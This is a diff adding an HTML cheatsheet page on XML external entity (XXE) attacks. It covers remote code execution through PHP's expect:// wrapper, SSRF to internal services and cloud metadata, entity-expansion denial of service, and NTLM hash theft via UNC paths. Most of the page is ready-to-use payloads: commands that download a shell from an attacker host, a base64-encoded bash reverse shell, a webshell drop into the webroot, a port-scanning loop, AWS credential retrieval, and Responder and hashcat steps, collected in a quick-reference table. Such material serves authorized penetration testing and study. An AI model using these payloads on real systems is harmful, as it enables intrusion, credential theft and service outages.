@@ -1,0 +1,405 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RCE and SSRF · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › XXE</nav><h1>RCE and SSRF</h1><p class="cx-lede">XXE primitives beyond file disclosure - PHP expect:// wrapper for direct command execution and webshell drop, internal port scanning via SSRF over external entities, the billion-laughs entity expansion DoS pattern (and why modern parsers prevent it), and Windows UNC path abuse for NTLM hash theft against attacker-controlled SMB shares.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059, T1499</span><span class="cx-tag">D3FEND D3-IAA, D3-RAPA</span><span class="cx-tag">IMPACT RCE, SSRF, DoS, CredentialTheft</span><span class="cx-tag">OWASP A05, A01</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>XXE isn't only about file reads. Four additional primitives depending on parser and target:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. PHP expect:// for direct RCE (requires expect module loaded - uncommon)
+&lt;!ENTITY xxe SYSTEM &quot;expect://curl$IFS-O$IFS&#x27;http://attacker/shell.php&#x27;&quot;&gt;
+
+# 2. SSRF - make the parser fetch internal URLs
+&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080/admin&quot;&gt;
+&lt;!ENTITY xxe SYSTEM &quot;http://internal-service.local/api/secrets&quot;&gt;
+
+# 3. Billion laughs DoS (often blocked in modern parsers)
+&lt;!ENTITY a0 &quot;DOS&quot;&gt;
+&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
+&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;...&quot;&gt;  (recursive expansion, 10^N total)
+
+# 4. Windows UNC path → NTLM hash to attacker-controlled SMB
+&lt;!ENTITY xxe SYSTEM &quot;\\attacker.example.com\share\anyfile&quot;&gt;</code></pre></figure>
+<p>Success indicator depends on path: shell on the target (RCE), internal service response leaked back via reflection or OOB (SSRF), target's response slow/error/crash (DoS), or a Responder/SMB capture of the target's NTLM hashes.</p>
+<h2 id="rce-via-php-expect">RCE via PHP expect://</h2>
+<p>The <code>expect://</code> wrapper is part of PHP's <code>pecl-expect</code> extension. When loaded, it executes commands on the host:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre></figure>
+<p>If <code>expect</code> is loaded, the response includes the output of <code>id</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Thanks uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<p>That's immediate RCE.</p>
+<h3 id="the-reality-check">The reality check</h3>
+<p>PHP <code>expect</code> is <strong>not enabled by default</strong> on any modern PHP install. It's a manually-installed PECL extension, and most distros don't include it in their default packages. In a real engagement, expect-enabled targets are rare - when you find one, it's usually a legacy app or a deliberately weakened lab environment.</p>
+<p>Always test for it even though it's rare - the cost is one extra payload and the payoff is full RCE in a single shot.</p>
+<h3 id="detecting-expect-support">Detecting expect support</h3>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</code></pre></figure>
+<p>If the response contains the output of <code>id</code>, expect is loaded. If it returns empty, an error, or "wrapper not supported," it's not. Either way, move on.</p>
+<h3 id="crafting-expect-commands">Crafting expect commands</h3>
+<p>Two constraints on what you can pass to <code>expect://</code>:</p>
+<ol>
+<li><strong>XML reserved characters</strong>: <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>, <code>'</code> will break the XML if used in the command without entity-encoding. Avoid them.</li>
+<li><strong>URL syntax</strong>: characters with URL-special meaning (<code>?</code>, <code>#</code>, <code>&amp;</code>, spaces) get parsed weirdly. Spaces in particular usually break the wrapper.</li>
+</ol>
+<p>The standard workaround for spaces is <code>$IFS</code> (the shell's Internal Field Separator, which defaults to space/tab/newline):</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM &quot;expect://curl$IFS-O$IFS&#x27;http://attacker:8000/shell.php&#x27;&quot;&gt;</code></pre></figure>
+<p>Expands to: <code>curl -O 'http://attacker:8000/shell.php'</code></p>
+<p>For more complex commands, base64-encode and pipe to <code>bash</code>:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ echo &#x27;bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1&quot;&#x27; | base64
+YmFzaCAtYyAiL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwL2F0dGFja2VyLzQ0NDQgMD4mMSIK</code></pre></figure>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM &quot;expect://echo$IFS&#x27;YmFzaC...K&#x27;|base64$IFS-d|bash&quot;&gt;</code></pre></figure>
+<p>Pipes (<code>|</code>) often survive in expect:// URLs but test first - some parsers URL-decode and break on <code>|</code>.</p>
+<h3 id="webshell-drop-pattern">Webshell drop pattern</h3>
+<p>The cleanest single-shot RCE-to-shell pattern:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># On attacker host
+$ echo &#x27;&lt;?php system($_REQUEST[&quot;cmd&quot;]);?&gt;&#x27; &gt; shell.php
+$ python3 -m http.server 8000</code></pre></figure>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;expect://curl$IFS-o$IFS/var/www/html/shell.php$IFS&#x27;http://attacker:8000/shell.php&#x27;&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre></figure>
+<p>The target uses curl to download your shell.php into its own webroot. Now you have a persistent webshell:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl &#x27;http://target/shell.php?cmd=id&#x27;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<p>Trade-off: dropping a file is louder than one-shot RCE - but persistent shell is worth the noise in most engagements.</p>
+<h3 id="what-if-expect-isnt-loaded">What if expect isn't loaded</h3>
+<p>When <code>expect://</code> isn't available, RCE through XXE alone usually isn't possible. The pivots:</p>
+<ul>
+<li><strong>Use file disclosure to find credentials</strong> (see <a href="../file-disclosure/index.html">File disclosure</a>) - DB passwords in config files, SSH keys, AWS keys</li>
+<li><strong>Use SSRF to reach internal services</strong> (next section) - internal admin panels, unauthenticated metadata services, internal API endpoints</li>
+<li><strong>Chain with another vulnerability</strong> - an upload, an SSTI in a different field, an admin-only function via IDOR</li>
+</ul>
+<p>XXE without expect is "file read + SSRF + maybe DoS." That's still highly impactful.</p>
+<h2 id="ssrf-via-xxe">SSRF via XXE</h2>
+<p>External entity URIs aren't limited to <code>file://</code>. The parser will resolve <code>http://</code> and <code>https://</code> URIs too, which makes XXE a vehicle for Server-Side Request Forgery - making the target's parser fetch URLs from the target's network perspective.</p>
+<h3 id="basic-internal-probe">Basic internal probe</h3>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080/&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre></figure>
+<p>If the target has an admin panel on localhost:8080 not exposed externally, this fetches its homepage. The HTML response gets reflected back through the <code>&lt;name&gt;</code> field.</p>
+<p>For non-reflected variants, use the OOB pattern from <a href="../blind-exfil/index.html">Blind exfil</a> - your listener receives the internal response.</p>
+<h3 id="internal-port-scanning">Internal port scanning</h3>
+<p>Loop XXE payloads over a port range and observe response differences:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ for port in 22 80 443 3306 5432 6379 8080 8443 9000 11211; do
+    response=$(curl -s -X POST http://target/api/submit \
+                    -H &#x27;Content-Type: application/xml&#x27; \
+                    --data &quot;&lt;?xml version=&#x27;1.0&#x27;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#x27;http://127.0.0.1:$port/&#x27;&gt;]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;&quot;)
+    size=$(echo -n &quot;$response&quot; | wc -c)
+    echo &quot;Port $port: $size bytes&quot;
+  done</code></pre></figure>
+<p>Patterns to look for:</p>
+<table>
+<thead>
+<tr>
+<th>Response</th>
+<th>Likely state</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reasonable HTML/JSON content</td>
+<td>Port open, service responded</td>
+</tr>
+<tr>
+<td>Empty / very small response</td>
+<td>Port open but service didn't respond as HTTP (e.g., SSH banner)</td>
+</tr>
+<tr>
+<td>Connection refused error</td>
+<td>Port closed</td>
+</tr>
+<tr>
+<td>Timeout</td>
+<td>Port filtered (firewall)</td>
+</tr>
+</tbody>
+</table>
+<p>Note that timing varies per parser. Some parsers wait 30+ seconds on connection timeouts - set per-request timeouts in your scanner accordingly.</p>
+<h3 id="reaching-cloud-metadata-services">Reaching cloud metadata services</h3>
+<p>The classic high-value internal target on cloud hosts:</p>
+<table>
+<thead>
+<tr>
+<th>Cloud</th>
+<th>Metadata URL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AWS</td>
+<td><code>http://169.254.169.254/latest/meta-data/</code></td>
+</tr>
+<tr>
+<td>AWS (IMDSv2 - requires PUT)</td>
+<td>Token-based; harder to use XXE for</td>
+</tr>
+<tr>
+<td>GCP</td>
+<td><code>http://metadata.google.internal/computeMetadata/v1/</code> (needs <code>Metadata-Flavor: Google</code> header)</td>
+</tr>
+<tr>
+<td>Azure</td>
+<td><code>http://169.254.169.254/metadata/instance</code> (needs <code>Metadata: true</code> header)</td>
+</tr>
+<tr>
+<td>Oracle Cloud</td>
+<td><code>http://192.0.0.192/latest/</code></td>
+</tr>
+</tbody>
+</table>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;&gt;</code></pre></figure>
+<p>If the instance has an IAM role attached, this returns the role name. Follow up with:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/INSTANCE_ROLE&quot;&gt;</code></pre></figure>
+<p>Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, SessionToken). Use with <code>aws-cli</code> to operate as the instance's IAM role.</p>
+<p>GCP and Azure require headers, which XXE alone can't add - XML entity URLs don't carry headers. For metadata services that require headers, XXE can confirm reachability but not actually retrieve credentials.</p>
+<h3 id="reaching-internal-admin-panels">Reaching internal admin panels</h3>
+<p>Beyond cloud metadata, internal admin panels are common XXE-SSRF targets:</p>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Default port</th>
+<th>Sometimes accessible</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Jenkins</td>
+<td>8080</td>
+<td><code>http://127.0.0.1:8080/script</code> (Groovy console - direct RCE)</td>
+</tr>
+<tr>
+<td>Tomcat manager</td>
+<td>8080</td>
+<td><code>http://127.0.0.1:8080/manager/html</code></td>
+</tr>
+<tr>
+<td>Elasticsearch</td>
+<td>9200</td>
+<td><code>http://127.0.0.1:9200/_cluster/health</code></td>
+</tr>
+<tr>
+<td>MongoDB REST</td>
+<td>28017</td>
+<td><code>http://127.0.0.1:28017/</code></td>
+</tr>
+<tr>
+<td>Redis</td>
+<td>6379</td>
+<td>Not HTTP, but some Redis configs respond to HTTP-shaped queries</td>
+</tr>
+<tr>
+<td>etcd</td>
+<td>2379</td>
+<td><code>http://127.0.0.1:2379/v2/keys/</code></td>
+</tr>
+<tr>
+<td>Consul</td>
+<td>8500</td>
+<td><code>http://127.0.0.1:8500/v1/agent/self</code></td>
+</tr>
+<tr>
+<td>Kubernetes API</td>
+<td>6443</td>
+<td><code>https://127.0.0.1:6443/api/v1/namespaces</code> (usually requires auth)</td>
+</tr>
+</tbody>
+</table>
+<p>Each is worth a probe - the value of finding one is high (often direct admin access on the internal service).</p>
+<h3 id="ssrf-protocol-scope">SSRF protocol scope</h3>
+<p>The protocols a parser supports vary:</p>
+<table>
+<thead>
+<tr>
+<th>Protocol</th>
+<th>libxml2 (PHP)</th>
+<th>Java SAX</th>
+<th>.NET XmlReader</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>file://</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>http://</code>, <code>https://</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>ftp://</code></td>
+<td>Yes</td>
+<td>Sometimes</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>gopher://</code></td>
+<td>No</td>
+<td>Sometimes</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>expect://</code></td>
+<td>If module loaded</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>jar://</code></td>
+<td>No</td>
+<td><strong>Yes</strong></td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>netdoc://</code></td>
+<td>No</td>
+<td>Yes</td>
+<td>No</td>
+</tr>
+</tbody>
+</table>
+<p>Java's <code>jar://</code> protocol is particularly interesting - it fetches a JAR over HTTP and extracts a specific file from inside. Sometimes useful for blind exfil because the response timing differs from a raw HTTP fetch.</p>
+<h2 id="billion-laughs-dos">Billion-laughs DoS</h2>
+<p>The historical denial-of-service payload:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY a0 &quot;DOS&quot;&gt;
+  &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
+  &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
+  &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;
+  &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;
+  &lt;!ENTITY a5 &quot;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&quot;&gt;
+  &lt;!ENTITY a6 &quot;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&quot;&gt;
+  &lt;!ENTITY a7 &quot;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&quot;&gt;
+  &lt;!ENTITY a8 &quot;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&quot;&gt;
+  &lt;!ENTITY a9 &quot;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&quot;&gt;
+  &lt;!ENTITY a10 &quot;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;a10;&lt;/name&gt;&lt;/root&gt;</code></pre></figure>
+<p><code>a10</code> resolves to 10 copies of <code>a9</code>, each of which is 10 copies of <code>a8</code>, ... down to <code>a0</code> which is the literal <code>"DOS"</code>. Total expansion: 10¹¹ characters = 100 GB of memory. The parser tries to materialize the string, runs out of memory, crashes.</p>
+<h3 id="why-this-rarely-works-in-2024">Why this rarely works in 2024</h3>
+<p>Every major XML parser shipped between 2012 and 2018 added protection:</p>
+<ul>
+<li><strong>libxml2</strong> (PHP, Python <code>lxml</code>, others): enforces a hard limit on entity expansion (10MB default since 2.9.0, configurable via <code>XML_PARSE_HUGE</code>)</li>
+<li><strong>Java</strong>: <code>XML_LIMIT_ENTITY_EXPANSION</code> system property; defaults to 64,000 expansions</li>
+<li><strong>.NET</strong>: <code>XmlReaderSettings.MaxCharactersFromEntities</code> defaults to disabled</li>
+</ul>
+<p>Modern targets reject the payload outright with "entity expansion limit exceeded" or just refuse to expand past the budget. Try it once on every XXE-vulnerable target to check, but expect failure.</p>
+<h3 id="quadratic-blowup-the-actually-still-works-variant">Quadratic blowup - the actually-still-works variant</h3>
+<p>A different DoS payload bypasses entity expansion limits by using a single entity many times:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY a &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(10,000 chars)...aaa&quot;&gt;
+]&gt;
+&lt;root&gt;
+  &amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;...(repeated 10,000 times)...&amp;a;&amp;a;&amp;a;
+&lt;/root&gt;</code></pre></figure>
+<p>This isn't recursive - it's just 10,000 references to a 10,000-char entity, producing 100MB output. Entity-expansion limits don't catch it because there's no recursion. Parsers with no output-size limit will materialize the full 100MB and slow down.</p>
+<p>Modern parsers added output-size limits to address this, but the protection is patchier than recursive-expansion protection. Worth trying on targets where billion-laughs fails.</p>
+<h2 id="windows-unc-hash-theft">Windows UNC hash theft</h2>
+<p>When the target is a Windows host parsing XML with external entity support, UNC paths trigger SMB connections - and SMB connections leak NTLM hashes:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;\\attacker.example.com\share\anyfile.txt&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre></figure>
+<p>The parser tries to open the file via SMB. To authenticate the SMB connection, Windows sends the target service account's NTLM hash to the attacker-controlled SMB server.</p>
+<h3 id="capturing-with-responder">Capturing with Responder</h3>
+<p>On the attacker host:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ sudo responder -I eth0</code></pre></figure>
+<p>Responder listens for SMB authentication attempts and captures NTLMv2 hashes:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>[SMB] NTLMv2-SSP Client   : 10.10.10.42
+[SMB] NTLMv2-SSP Username : CORP\webapp_svc
+[SMB] NTLMv2-SSP Hash     : webapp_svc::CORP:1122334455667788:...</code></pre></figure>
+<p>Crack offline with hashcat:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ hashcat -m 5600 ntlmv2.txt rockyou.txt</code></pre></figure>
+<p>If the service account uses a guessable password, you get plaintext credentials for a domain-joined account - direct path to lateral movement.</p>
+<h3 id="prerequisites">Prerequisites</h3>
+<p>This works when:</p>
+<ul>
+<li>The XML parser supports <code>\\...\</code> UNC paths (some do, some don't)</li>
+<li>The target's OS is Windows</li>
+<li>The target can reach the attacker's SMB port (445/TCP) outbound - many environments firewall this, but inside-out SMB is common in less-mature setups</li>
+<li>The XML parser runs as a domain-joined account (workstation/local accounts also work but with less downstream value)</li>
+</ul>
+<p>Outbound SMB from web servers is heavily monitored / firewalled in mature environments. In permissive networks (lab, internal apps, smaller orgs), this still works.</p>
+<h3 id="alternative-http-ntlm-via-unc">Alternative: HTTP NTLM via UNC</h3>
+<p>If outbound SMB is blocked but HTTP isn't, some Windows components negotiate NTLM over HTTP for paths that look like web shares:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM &quot;http://attacker.example.com/share/anyfile&quot;&gt;</code></pre></figure>
+<p>If the parser uses Windows's URL fetching APIs (which negotiate NTLM by default for non-Internet zones), it sends NTLM auth to your HTTP server. Capture with <code>ntlmrelayx</code> or a custom listener.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Primitive</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RCE via expect (id check)</td>
+<td><code>&lt;!ENTITY xxe SYSTEM "expect://id"&gt;</code></td>
+</tr>
+<tr>
+<td>RCE webshell drop</td>
+<td><code>&lt;!ENTITY xxe SYSTEM "expect://curl$IFS-o$IFS/var/www/html/s.php$IFS'http://A/s.php'"&gt;</code></td>
+</tr>
+<tr>
+<td>SSRF localhost</td>
+<td><code>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080/"&gt;</code></td>
+</tr>
+<tr>
+<td>SSRF internal hostname</td>
+<td><code>&lt;!ENTITY xxe SYSTEM "http://internal-api.local/admin"&gt;</code></td>
+</tr>
+<tr>
+<td>SSRF AWS metadata</td>
+<td><code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;</code></td>
+</tr>
+<tr>
+<td>Port scan loop</td>
+<td>bash for-loop over ports + XXE per port</td>
+</tr>
+<tr>
+<td>Billion-laughs DoS</td>
+<td>Nested <code>&lt;!ENTITY aN&gt;</code> referencing <code>aN-1</code> 10 times each</td>
+</tr>
+<tr>
+<td>Quadratic blowup DoS</td>
+<td>One large entity, referenced 10000+ times in body</td>
+</tr>
+<tr>
+<td>Windows UNC NTLM theft</td>
+<td><code>&lt;!ENTITY xxe SYSTEM "\\attacker.com\share\file"&gt;</code></td>
+</tr>
+<tr>
+<td>Capture NTLM</td>
+<td><code>sudo responder -I eth0</code></td>
+</tr>
+<tr>
+<td><code>$IFS</code> for spaces in expect</td>
+<td><code>expect://curl$IFS-O$IFS'URL'</code></td>
+</tr>
+<tr>
+<td>Detect expect loaded</td>
+<td>Send <code>expect://id</code>; if output appears, it's loaded</td>
+</tr>
+<tr>
+<td>Cloud metadata services</td>
+<td>AWS: 169.254.169.254; GCP: metadata.google.internal; Azure: 169.254.169.254</td>
+</tr>
+</tbody>
+</table>
+<p>For tool-driven automation across the various XXE primitives (blind exfil, file read, port scan), see <a href="../automation/index.html">Automation</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../blind-exfil/index.html">Previous: Blind Exfil</a><a class="cx-next" href="../automation/index.html">Next: Automation</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
